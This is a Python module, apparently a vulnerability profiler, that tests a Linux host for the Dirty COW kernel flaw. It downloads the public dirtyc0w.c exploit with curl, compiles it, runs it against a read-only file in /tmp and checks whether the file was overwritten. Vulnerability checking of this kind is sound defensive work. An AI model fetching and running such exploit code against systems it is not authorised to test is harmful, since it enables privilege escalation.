import time
import subprocess
from profilers.utils import call_shell_wrapper

class DirtyC0W(object):
    def setup(self):
        self.build_exploit()
        self.run_exploit()
        return self.check_result()

    def build_exploit(self):
        call_shell_wrapper(["curl https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c > /tmp/dirtyc0w.c"])
        call_shell_wrapper(["gcc", "-static", "-s", "-pthread", "/tmp/dirtyc0w.c", "-o", "/tmp/dirtyc0w"])

    def run_exploit(self):
        call_shell_wrapper(["echo", "you are safe", ">", "/tmp/cowsayvulns"])
        call_shell_wrapper(["chmod 404 /tmp/cowsayvulns /tmp/cowsayvulns"])
        p = subprocess.Popen(["/tmp/dirtyc0w", "/tmp/cowsayvulns", "moooooooooo"])

        time.sleep(4)
        p.kill()

    def check_result(self):
        res = open("/tmp/cowsayvulns", "r").read()
        if res == "you are safe":
            return False
        elif res == "moooooooooo":
            return True
        else:
            return False